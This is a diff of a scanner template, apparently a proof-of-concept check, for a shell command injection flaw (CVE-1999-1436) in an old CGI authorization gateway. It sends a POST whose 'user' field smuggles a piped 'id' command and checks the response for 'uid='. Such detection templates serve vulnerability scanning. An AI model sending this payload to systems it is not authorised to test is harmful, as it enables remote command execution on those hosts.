@@ -1,14 +1,10 @@
 [info]
-author = "AVE"
-description = "Ray Chan WWW Authorization Gateway 0.1 CGI 程序的 user 参数存在 shell 元字符注入漏洞。远程攻击者无需认证即可通过构造包含管道符等 shell 元字符的 user 参数值，使 CGI 程序执行任意系统命令。验证方式：向 CGI 发送带命令注入 payload 的请求，检测响应中是否包含命令执行结果。"
+author = "ave"
+description = "通过向 user 参数注入管道符和系统命令检测 CGI 命令注入漏洞，脚本将 user 参数直接拼接至 grep 反引号命令中执行"
 id = "POC-AVE-1999-1273"
 name = "Ray Chan WWW Authorization Gateway 0.1 Command Injection PoC"
 severity = "high"
-tags = [
-    "cve-1999-1436",
-    "command-injection",
-    "cgi",
-]
+tags = ["ave-1999-1273"]
 vuln_id = [
     "CVE-1999-1436",
     "AVE-1999-1273",
@@ -19,30 +15,15 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/auth.cgi"
+path = "/{{BaseURL}}/cgi-bin/authorize"
 protocol = "http"
 
 [poc.requests.body]
-content = "user=|id&password=test"
+content = "user=%7Cid&password=test"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["uid="]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/auth.cgi?user=%7Cid&password=test"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
